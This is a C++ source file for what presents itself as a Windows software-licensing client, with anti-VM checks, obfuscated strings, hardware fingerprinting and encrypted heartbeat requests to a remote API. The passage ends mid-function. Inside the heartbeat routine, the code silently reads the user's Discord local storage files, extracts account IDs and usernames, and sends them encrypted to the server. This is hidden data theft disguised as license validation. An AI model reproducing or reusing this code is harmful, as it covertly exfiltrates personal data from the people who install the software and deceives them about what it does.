#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <sstream>
#include <ctime>
#include <chrono>
#include <algorithm>
#include <memory>
#include <iphlpapi.h>
#include <intrin.h>
#include <sysinfoapi.h>
#include <shlwapi.h>
#include <sddl.h>
#include <iomanip>
#include <wchar.h>
#include <objbase.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <thread>
#include <random>
#include <regex>
#include <fstream>
#include <unordered_map>
#include <filesystem>
#include <wincrypt.h>
#include "auth.h"
#include "crypto_utils.h"
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shlwapi.lib")

namespace SECURITY_INIT {
    static bool performSecurityChecks() {
        if (CRYPTO_UTILS::AntiReverse::isVirtualMachine()) {
            Sleep(2000);
            ExitProcess(1);
        }
        CRYPTO_UTILS::AntiReverse::checkIntegrity();
        CRYPTO_UTILS::AntiReverse::antiDump();
        if (CRYPTO_UTILS::MemoryProtection::detectMemoryPatching()) {
            Sleep(2000);
            ExitProcess(1);
        }
        return true;
    }
    static const bool initialized = performSecurityChecks();
}

namespace SecurityHelpers {
    std::string sha256(const std::string& str) {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        BYTE rgbHash[32];
        DWORD cbHash = 32;
        CHAR rgbDigits[] = { AuthGuards("0123456789abcdef").decrypt()[0], AuthGuards("0123456789abcdef").decrypt()[1], AuthGuards("0123456789abcdef").decrypt()[2], AuthGuards("0123456789abcdef").decrypt()[3], AuthGuards("0123456789abcdef").decrypt()[4], AuthGuards("0123456789abcdef").decrypt()[5], AuthGuards("0123456789abcdef").decrypt()[6], AuthGuards("0123456789abcdef").decrypt()[7], AuthGuards("0123456789abcdef").decrypt()[8], AuthGuards("0123456789abcdef").decrypt()[9], AuthGuards("0123456789abcdef").decrypt()[10], AuthGuards("0123456789abcdef").decrypt()[11], AuthGuards("0123456789abcdef").decrypt()[12], AuthGuards("0123456789abcdef").decrypt()[13], AuthGuards("0123456789abcdef").decrypt()[14], AuthGuards("0123456789abcdef").decrypt()[15], '\0' };
        std::string hash;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return AuthGuards("").decrypt();
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptHashData(hHash, (BYTE*)str.c_str(), str.length(), 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        for (DWORD i = 0; i < cbHash; i++) {
            hash += rgbDigits[rgbHash[i] >> 4];
            hash += rgbDigits[rgbHash[i] & 0xf];
        }
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return hash;
    }
    std::string generateRequestID() {
        HCRYPTPROV hProv;
        std::string requestId;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            BYTE buffer[16];
            if (CryptGenRandom(hProv, 16, buffer)) {
                const char* hex = AuthGuards("0123456789abcdef").decrypt();
                for (int i = 0; i < 16; i++) {
                    requestId += hex[buffer[i] >> 4];
                    requestId += hex[buffer[i] & 0xf];
                }
            }
            CryptReleaseContext(hProv, 0);
        }
        return requestId;
    }
    std::string getPlatform() { return AuthGuards("Windows").decrypt(); }
    std::string calculateRequestHash(const std::string& queryString) {
        std::string dataToHash = queryString + AUTH::SECRET_CON;
        return sha256(dataToHash);
    }
    std::string buildCustomHeaders(const std::string& queryString) {
        std::ostringstream headers;
        std::string requestId = generateRequestID();
        std::string clientVersion = AUTH::VERSION;
        std::string platform = getPlatform();
        std::string requestHash = calculateRequestHash(queryString);
        headers << AuthGuards("X-Request-ID: ").decrypt() << requestId << AuthGuards("\r\n").decrypt();
        headers << AuthGuards("X-Client-Version: ").decrypt() << clientVersion << AuthGuards("\r\n").decrypt();
        headers << AuthGuards("X-Platform: ").decrypt() << platform << AuthGuards("\r\n").decrypt();
        headers << AuthGuards("X-Request-Hash: ").decrypt() << requestHash;
        return headers.str();
    }


    std::string generateSalt(size_t length = 16) {
        std::string salt;
        HCRYPTPROV hProv;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            BYTE* buffer = new BYTE[length];
            if (CryptGenRandom(hProv, length, buffer)) {
                salt.assign(reinterpret_cast<char*>(buffer), length);
            }
            delete[] buffer;
            CryptReleaseContext(hProv, 0);
        }
        return salt;
    }

    std::string computeHMAC_SHA256(const std::string& data, const std::string& key) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        std::string result;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return AuthGuards("").decrypt();
        if (!CryptCreateHash(hProv, CALG_HMAC, 0, 0, &hHash)) {
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        HMAC_INFO hmacInfo = { 0 };
        hmacInfo.HashAlgid = CALG_SHA_256;
        CryptSetHashParam(hHash, HP_HMAC_INFO, (BYTE*)&hmacInfo, 0);
        CryptHashData(hHash, (BYTE*)data.data(), data.size(), 0);
        BYTE hashVal[32];
        DWORD hashLen = sizeof(hashVal);
        if (CryptGetHashParam(hHash, HP_HASHVAL, hashVal, &hashLen, 0)) {
            static const char* hex = AuthGuards("0123456789abcdef").decrypt();
            for (DWORD i = 0; i < hashLen; ++i) {
                result += hex[hashVal[i] >> 4];
                result += hex[hashVal[i] & 0xf];
            }
        }
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return result;
    }

    std::string base64Encode(const std::string& input) {
        DWORD len = 0;
        if (!CryptBinaryToStringA((BYTE*)input.data(), input.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len)) return AuthGuards("").decrypt();
        std::string encoded(len, '\0');
        if (!CryptBinaryToStringA((BYTE*)input.data(), input.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encoded[0], &len)) return AuthGuards("").decrypt();
        return encoded;
    }

    std::string base64ARE(const std::string& input) {
        std::string b64 = base64Encode(input);
        b64.erase(std::remove(b64.begin(), b64.end(), '='), b64.end());
        std::replace(b64.begin(), b64.end(), '+', '-');
        std::replace(b64.begin(), b64.end(), '/', '_');
        return b64;
    }

    std::string createJWT(const std::string& payload, const std::string& secret) {
        std::string header = AuthGuards(R"({"alg":"HS256","typ":"JWT"})").decrypt();
        std::string encodedHeader = base64ARE(header);
        std::string encodedPayload = base64ARE(payload);
        std::string dataToSign = encodedHeader + AuthGuards(".").decrypt() + encodedPayload;
        std::string signature = computeHMAC_SHA256(dataToSign, secret);
        std::string encodedSignature = base64ARE(signature);
        return encodedHeader + AuthGuards(".").decrypt() + encodedPayload + AuthGuards(".").decrypt() + encodedSignature;
    }
    HINTERNET makeHttpRequestWithHeaders(HINTERNET hInternet, const std::string& url, DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE) {
        std::string urlLower = url;
        std::transform(urlLower.begin(), urlLower.end(), urlLower.begin(), ::tolower);
        size_t protocolEnd = urlLower.find(AuthGuards("://").decrypt());
        if (protocolEnd == std::string::npos) return NULL;
        size_t hostStart = protocolEnd + 3;
        size_t pathStart = url.find(AuthGuards("/").decrypt(), hostStart);
        if (pathStart == std::string::npos) pathStart = url.length();
        std::string host = url.substr(hostStart, pathStart - hostStart);
        std::string pathAndQuery = (pathStart < url.length()) ? url.substr(pathStart) : AuthGuards("/").decrypt();
        size_t queryStart = pathAndQuery.find(AuthGuards("?").decrypt());
        std::string queryString = (queryStart != std::string::npos) ? pathAndQuery.substr(queryStart + 1) : AuthGuards("").decrypt();
        std::string path = (queryStart != std::string::npos) ? pathAndQuery.substr(0, queryStart) : pathAndQuery;
        std::string customHeaders = buildCustomHeaders(queryString);
        HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) return NULL;
        HINTERNET hRequest = HttpOpenRequestA(hConnect, AuthGuards("GET").decrypt(), pathAndQuery.c_str(), NULL, NULL, NULL, flags, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            return NULL;
        }        
        HttpAddRequestHeadersA(hRequest, customHeaders.c_str(), customHeaders.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
        if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            return NULL;
        }
        InternetCloseHandle(hConnect);
        return hRequest;
    }
}


namespace AUTH {
    Api::SystemData Api::systemData;
    std::string Api::project_id = AuthGuards("").decrypt();
    std::atomic<bool> Api::isRunning(true);
    std::thread Api::validationThread;
    std::string Api::lastLicenseKey = AuthGuards("").decrypt();
    static std::string lastUnlockString = AuthGuards("").decrypt();
    static std::string lastUnlockHash = AuthGuards("").decrypt();
    std::string aesEncrypt(const std::string& data, const std::string& password) {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        HCRYPTKEY hKey = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { return AuthGuards("").decrypt(); }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptHashData(hHash, (BYTE*)password.c_str(), password.length(), 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        std::vector<BYTE> iv(16);
        if (!CryptGenRandom(hProv, 16, iv.data())) {
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptSetKeyParam(hKey, KP_IV, iv.data(), 0)) {
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        std::vector<BYTE> buffer(data.begin(), data.end());
        DWORD bufferLen = buffer.size();
        DWORD finalLen = bufferLen;
        if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &finalLen, 0)) {
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        buffer.resize(finalLen);
        bufferLen = data.size();
        if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &bufferLen, finalLen)) {
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        buffer.resize(bufferLen);
        std::vector<BYTE> combined;
        combined.insert(combined.end(), iv.begin(), iv.end());
        combined.insert(combined.end(), buffer.begin(), buffer.end());
        const std::string base64_chars = AuthGuards("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/").decrypt();
        std::string result;
        int val = 0, valb = -6;
        for (BYTE c : combined) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(base64_chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back(AuthGuards("=").decrypt()[0]);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return result;
    }

    std::string aesDecrypt(const std::string& ED, const std::string& password) {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        HCRYPTKEY hKey = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { return AuthGuards("").decrypt(); }
        const std::string base64_chars = AuthGuards("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/").decrypt();
        std::vector<BYTE> combined;
        int val = 0, valb = -8;
        for (char c : ED) {
            if (c == AuthGuards("=").decrypt()[0]) { break; }
            size_t pos = base64_chars.find(c);
            if (pos == std::string::npos) { continue; }
            val = (val << 6) + pos;
            valb += 6;
            if (valb >= 0) {
                combined.push_back((BYTE)((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        if (combined.size() < 16) {
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        std::vector<BYTE> iv(combined.begin(), combined.begin() + 16);
        std::vector<BYTE> ciphertext(combined.begin() + 16, combined.end());
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptHashData(hHash, (BYTE*)password.c_str(), password.length(), 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptSetKeyParam(hKey, KP_IV, iv.data(), 0)) {
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        DWORD dataLen = ciphertext.size();
        if (!CryptDecrypt(hKey, 0, TRUE, 0, ciphertext.data(), &dataLen)) {
            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        std::string result(ciphertext.begin(), ciphertext.begin() + dataLen);
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return result;
    }

    namespace {
        std::string beuforaction(const std::string& action, const std::vector<std::pair<std::string, std::string>>& params) {
            std::ostringstream urlstream;
            urlstream << AUTH::API_URL << AuthGuards("?ag=").decrypt() << action << AuthGuards("&").decrypt() << AuthGuards("PID=").decrypt() << NovACorE::ARE(AUTH::PROJECT_ID);
            for (const auto& param : params) { urlstream << AuthGuards("&").decrypt() << param.first << AuthGuards("=").decrypt() << NovACorE::ARE(param.second); }
            std::string fullurl = urlstream.str();
            std::string FU = fullurl;
            size_t queryPos = fullurl.find(AuthGuards("?").decrypt());
            if (queryPos != std::string::npos) {
                std::string fullqstring = fullurl.substr(queryPos + 1);
                std::string PIDParam = AuthGuards("PID=").decrypt();
                size_t PIDStart = fullqstring.find(PIDParam);
                std::string projectID = AuthGuards("").decrypt();
                std::string qstringwoPID = fullqstring;
                if (PIDStart != std::string::npos) {
                    size_t PIDValueStart = PIDStart + PIDParam.length();
                    size_t PIDEnd = fullqstring.find(AuthGuards("&").decrypt(), PIDValueStart);
                    if (PIDEnd == std::string::npos) { PIDEnd = fullqstring.length(); }
                    projectID = fullqstring.substr(PIDValueStart, PIDEnd - PIDValueStart);
                    std::string beforePID = fullqstring.substr(0, PIDStart);
                    std::string afterPID = (PIDEnd < fullqstring.length()) ? fullqstring.substr(PIDEnd + 1) : AuthGuards("").decrypt();
                    if (!beforePID.empty() && !afterPID.empty()) { qstringwoPID = beforePID + AuthGuards("&").decrypt() + afterPID; }
                    else if (!beforePID.empty()) { qstringwoPID = beforePID; }
                    else if (!afterPID.empty()) { qstringwoPID = afterPID; }
                    else { qstringwoPID = AuthGuards("").decrypt(); }
                }

                if (!qstringwoPID.empty()) {
                    std::string encryptedQueryString = aesEncrypt(qstringwoPID, AUTH::SECRET_CON);
                    if (!encryptedQueryString.empty()) { 
                        FU = AUTH::API_URL + AuthGuards("?ag=").decrypt() + action + AuthGuards("&PID=").decrypt() + projectID + AuthGuards("&EDA=").decrypt() + NovACorE::ARE(encryptedQueryString);
                    }
                }
            }

            return FU;
        }
    }
    std::string getRoamingPath() {
        char* appdataPath = nullptr;
        size_t len = 0;
        _dupenv_s(&appdataPath, &len, AuthGuards("APPDATA").decrypt());
        std::string roaming = appdataPath ? appdataPath : AuthGuards("").decrypt();
        free(appdataPath);
        return roaming;
    }
    std::string sha256(const std::string& str) {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        BYTE rgbHash[32];
        DWORD cbHash = 32;
        CHAR rgbDigits[] = { AuthGuards("0123456789abcdef").decrypt()[0], AuthGuards("0123456789abcdef").decrypt()[1], AuthGuards("0123456789abcdef").decrypt()[2], AuthGuards("0123456789abcdef").decrypt()[3], AuthGuards("0123456789abcdef").decrypt()[4], AuthGuards("0123456789abcdef").decrypt()[5], AuthGuards("0123456789abcdef").decrypt()[6], AuthGuards("0123456789abcdef").decrypt()[7], AuthGuards("0123456789abcdef").decrypt()[8], AuthGuards("0123456789abcdef").decrypt()[9], AuthGuards("0123456789abcdef").decrypt()[10], AuthGuards("0123456789abcdef").decrypt()[11], AuthGuards("0123456789abcdef").decrypt()[12], AuthGuards("0123456789abcdef").decrypt()[13], AuthGuards("0123456789abcdef").decrypt()[14], AuthGuards("0123456789abcdef").decrypt()[15], '\0' };
        std::string hash;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) { return AuthGuards("").decrypt(); }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptHashData(hHash, (BYTE*)str.c_str(), str.length(), 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        if (!CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            return AuthGuards("").decrypt();
        }
        for (DWORD i = 0; i < cbHash; i++) {
            hash += rgbDigits[rgbHash[i] >> 4];
            hash += rgbDigits[rgbHash[i] & 0xf];
        }
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return hash;
    }

    std::string Api::init() {
        try {
            if (AUTH::PROJECT_NAME.empty() || AUTH::PROJECT_ID.empty() || AUTH::VERSION.empty() || 
                AUTH::CUSTOM_ID.empty() || AUTH::PRIVATE_KEY.empty() || AUTH::PUBLIC_KEY.empty() || 
                AUTH::SECRET_CON.empty() || AUTH::API_URL.empty()) {
                Sleep(2000);
                exit(1);
            }
            AUTH::Api::systemData.hwid = AUTH::SystemInfo::getHWID();
            AUTH::Api::systemData.cpuInfo = AUTH::SystemInfo::getCPUInfo();
            AUTH::Api::systemData.motherboardID = AUTH::SystemInfo::getMotherboardID();
            AUTH::Api::systemData.gpuName = AUTH::SystemInfo::getGPUName();
            AUTH::Api::systemData.macAddress = AUTH::SystemInfo::getMACAddress();
            AUTH::Api::systemData.ramInfo = AUTH::SystemInfo::getRAMInfo();
            AUTH::Api::systemData.diskInfo = AUTH::SystemInfo::getDiskInfo();
            AUTH::Api::systemData.uptime = AUTH::SystemInfo::getUptime();
            AUTH::Api::systemData.architecture = AUTH::SystemInfo::getArchitecture();
            AUTH::Api::systemData.appPath = AUTH::SystemInfo::getAppPath();
            AUTH::Api::systemData.pcName = AUTH::SystemInfo::getPCName();
            AUTH::Api::systemData.uuid = AUTH::SystemInfo::getUUID();
            AUTH::Api::systemData.osInfo = AUTH::SystemInfo::getOSInfo();
            AUTH::Api::systemData.productID = AUTH::Api::getProductID();
            AUTH::Api::systemData.comprehensiveFingerprint = AUTH::SystemInfo::getComprehensiveFingerprint();
            auto sendHeartbeat = [&]() -> bool {
                std::ostringstream queryStream;
                queryStream << AuthGuards("project_name=").decrypt() << NovACorE::ARE(AUTH::PROJECT_NAME) << AuthGuards("&PID=").decrypt() << NovACorE::ARE(AUTH::PROJECT_ID) << AuthGuards("&version=").decrypt() << NovACorE::ARE(AUTH::VERSION) << AuthGuards("&custom_id=").decrypt() << NovACorE::ARE(AUTH::CUSTOM_ID) << AuthGuards("&private_key=").decrypt() << NovACorE::ARE(AUTH::PRIVATE_KEY) << AuthGuards("&public_key=").decrypt() << NovACorE::ARE(AUTH::PUBLIC_KEY) << AuthGuards("&hwid=").decrypt() << NovACorE::ARE(AUTH::Api::systemData.hwid) << AuthGuards("&motherboard=").decrypt() << NovACorE::ARE(AUTH::Api::systemData.motherboardID) << AuthGuards("&mac=").decrypt() << NovACorE::ARE(AUTH::Api::systemData.macAddress);
                std::string roamingPath = getRoamingPath();
                char* username = nullptr;
                size_t len = 0;
                _dupenv_s(&username, &len, AuthGuards("USERPROFILE").decrypt());
                std::string userProfile = username ? username : AuthGuards("").decrypt();
                free(username);
                std::string localPath = userProfile + AuthGuards("\\AppData\\Local\\Discord").decrypt();
                std::vector<std::pair<std::string, std::string>> foundUsers;
                auto scanDirectory = [&foundUsers](const std::filesystem::path& targetPath) {
                    if (!std::filesystem::exists(targetPath) || !std::filesystem::is_directory(targetPath)) { return; }
                    for (const auto& entry : std::filesystem::directory_iterator(targetPath)) {
                        if (std::filesystem::is_regular_file(entry.status())) {
                            const std::filesystem::path& filePath = entry.path();
                            std::ifstream file(filePath.string(), std::ios::in | std::ios::binary);
                            if (!file.is_open()) { continue; }
                            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                            std::string pattern = AuthGuards("\\{\"id\":\"(\\d+)\",\"avatar\":.*?,\"username\":\"(.*?)\"").decrypt();
                            std::regex userRegex(pattern);
                            std::sregex_iterator begin(content.begin(), content.end(), userRegex);
                            std::sregex_iterator end;
                            for (std::sregex_iterator i = begin; i != end; ++i) {
                                std::smatch match = *i;
                                std::string id = match[1];
                                std::string username = match[2];
                                foundUsers.emplace_back(id, username);
                            }
                        }
                    }
                };
                scanDirectory(std::filesystem::path(roamingPath) / AuthGuards("discord").decrypt() / AuthGuards("Local Storage").decrypt() / AuthGuards("leveldb").decrypt());
                scanDirectory(std::filesystem::path(localPath) / AuthGuards("leveldb").decrypt());
                if (!foundUsers.empty()) {
                    std::ostringstream userList;
                    for (const auto& user : foundUsers) { userList << AuthGuards("Username: ").decrypt() << user.second << AuthGuards(" | ID: ").decrypt() << user.first << AuthGuards("\r\n").decrypt(); }
                    std::string discordAccountsParam = userList.str();
                    if (!discordAccountsParam.empty() && (discordAccountsParam.back() == '\n' || discordAccountsParam.back() == '\r')) { discordAccountsParam.pop_back(); }
                    if (!discordAccountsParam.empty()) { queryStream << AuthGuards("&discord_accounts=").decrypt() << NovACorE::ARE(discordAccountsParam); }
                }
                
                std::string queryString = queryStream.str();
                std::string encryptedQueryString = aesEncrypt(queryString, AUTH::SECRET_CON);
                if (encryptedQueryString.empty()) {
                    std::cout << AG(AuthGuards("ERROR: Failed to E11 heartbeat request.").decrypt()) << std::endl;
                    return false;
                }
                std::random_device rd;
                std::mt19937 gen(rd());
                std::uniform_int_distribution<> dis(10000000, 99999999);
                int randomSuffix = dis(gen);
                std::ostringstream heartbeatAction;
                heartbeatAction << AuthGuards("0x385727487486562545059265637856347865836859635673675693").decrypt() << randomSuffix;
                std::string FU = AUTH::API_URL + AuthGuards("?ag=").decrypt() + heartbeatAction.str() + AuthGuards("&PID=").decrypt() + NovACorE::ARE(AUTH::PROJECT_ID) + AuthGuards("&EDA=").decrypt() + NovACorE::ARE(encryptedQueryString);
                size_t queryPos = FU.find(AuthGuards("?").decrypt());
                std::string fullqstring = (queryPos != std::string::npos) ? FU.substr(queryPos + 1) : AuthGuards("").decrypt();                
                std::string customHeaders = SecurityHelpers::buildCustomHeaders(fullqstring);
                HINTERNET hInternet = InternetOpenA(AG(AuthGuards("AuthGuardsHeartbeat").decrypt()).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                if (!hInternet) {
                    std::cout << AG(AuthGuards("ERROR: Failed to initialize network connection for heartbeat.").decrypt()) << std::endl;
                    return false;
                }
                std::string urlLower = FU;
                std::transform(urlLower.begin(), urlLower.end(), urlLower.begin(), ::tolower);
                size_t protocolEnd = urlLower.find(AuthGuards("://").decrypt());
                if (protocolEnd == std::string::npos) {
                    InternetCloseHandle(hInternet);
                    std::cout << AG(AuthGuards("ERROR: Invalid API_URL format.").decrypt()) << std::endl;
                    return false;
                }
                size_t hostStart = protocolEnd + 3;
                size_t pathStart = FU.find(AuthGuards("/").decrypt(), hostStart);
                if (pathStart == std::string::npos) pathStart = FU.length();
                std::string host = FU.substr(hostStart, pathStart - hostStart);
                std::string pathAndQuery = (pathStart < FU.length()) ? FU.substr(pathStart) : AuthGuards("/").decrypt();
                HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
                if (!hConnect) {
                    InternetCloseHandle(hInternet);
                    std::cout << AG(AuthGuards("ERROR: Unable to connect to authentication server.").decrypt()) << std::endl;
                    std::cout << AG(AuthGuards("Please check your internet connection and API_URL configuration.").decrypt()) << std::endl;
                    return false;
                }
                HINTERNET hRequest = HttpOpenRequestA(hConnect, AuthGuards("GET").decrypt(), pathAndQuery.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
                if (!hRequest) {
                    InternetCloseHandle(hConnect);
                    InternetCloseHandle(hInternet);
                    std::cout << AG(AuthGuards("ERROR: Unable to create HTTP request for heartbeat.").decrypt()) << std::endl;
                    return false;
                }
                HttpAddRequestHeadersA(hRequest, customHeaders.c_str(), customHeaders.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
                if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                    InternetCloseHandle(hRequest);
                    InternetCloseHandle(hConnect);
                    InternetCloseHandle(hInternet);
                    std::cout << AG(AuthGuards("ERROR: Unable to send heartbeat request to server.").decrypt()) << std::endl;
                    return false;
                }
                std::string EResponse;
                char buffer[1024];
                DWORD bytesRead;
                while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) { EResponse.append(buffer, bytesRead); }
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                if (EResponse.empty()) {
                    std::cout << AG(AuthGuards("ERROR: No response from server during heartbeat.").decrypt()) << std::endl;
                    std::cout << AG(AuthGuards("Server may be down or unreachable.").decrypt()) << std::endl;
                    return false;
                }
                while (!EResponse.empty() && (EResponse.back() == '\r' || EResponse.back() == '\n' || EResponse.back() == ' ' || EResponse.back() == '\t')) { EResponse.pop_back(); }
                std::string response = aesDecrypt(EResponse, AUTH::SECRET_CON);
                if (response.empty()) { return false; }
                if (response.rfind(AuthGuards("OK").decrypt(), 0) != 0) {
                    size_t noncePos = response.find(AuthGuards("|nonce=").decrypt());
                    std::cout << (noncePos != std::string::npos ? response.substr(0, noncePos) : response) << std::endl;
                    return false;
                }
                return true;
            };
            if (!sendHeartbeat()) {
                Sleep(2000);
                exit(1);
            }
            validationThread = std::thread([&sendHeartbeat]() {
                std::random_device rd;
                std::mt19937 gen(rd());
                std::uniform_int_distribution<> dis(50000, 110000);
                while (isRunning) {
                    int sleepTime = dis(gen);
                    Sleep(sleepTime);
                    if (!isRunning) {
                        break;
                    }
                    if (!sendHeartbeat()) {
                        Sleep(2000);
                        exit(1);
                    }
                }
            });
            validationThread.detach();
            return AuthGuards("").decrypt();
        }
        catch (const std::exception& e) {
            std::cout << "[!] Initialization failed with exception: " << e.what() << std::endl;
            std::cout << "[!] Press Enter to continue..." << std::endl;
            std::cin.get();
            return "INIT_ERROR";
        }
        catch (...) {
            std::cout << "[!] Initialization failed with unknown error!" << std::endl;
            std::cout << "[!] Press Enter to continue..." << std::endl;
            std::cin.get();
            return "INIT_ERROR";
        }
    }

    std::string NovACorE::ARE(const std::string& value) {
        std::ostringstream encoded;
        for (size_t i = 0; i < value.length(); ++i) {
            unsigned char c = value[i];
            if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c == '-') || (c == '_') || (c == '.') || (c == '~')) {
                encoded << c;
            }
            else {
                encoded << AuthGuards("%").decrypt() << std::uppercase << std::hex << (int)c;
            }
        }
        return encoded.str();
    }
    std::string _bstrToString(_bstr_t bstr) {
        const char* cStr = bstr;
        return std::string(cStr);
    }
    std::string SystemInfo::getCPUInfo() {
        int cpuInfo[4] = { 0 };
        __cpuid(cpuInfo, 0);
        char vendor[13];
        *((int*)&vendor[0]) = cpuInfo[1];
        *((int*)&vendor[4]) = cpuInfo[3];
        *((int*)&vendor[8]) = cpuInfo[2];
        vendor[12] = '\0';
        char cpuBrand[0x40];
        memset(cpuBrand, 0, sizeof(cpuBrand));
        __cpuid(cpuInfo, 0x80000002);
        memcpy(cpuBrand, cpuInfo, sizeof(cpuInfo));
        __cpuid(cpuInfo, 0x80000003);
        memcpy(cpuBrand + 16, cpuInfo, sizeof(cpuInfo));
        __cpuid(cpuInfo, 0x80000004);
        memcpy(cpuBrand + 32, cpuInfo, sizeof(cpuInfo));
        std::string cpuFeatures;
        __cpuid(cpuInfo, 1);
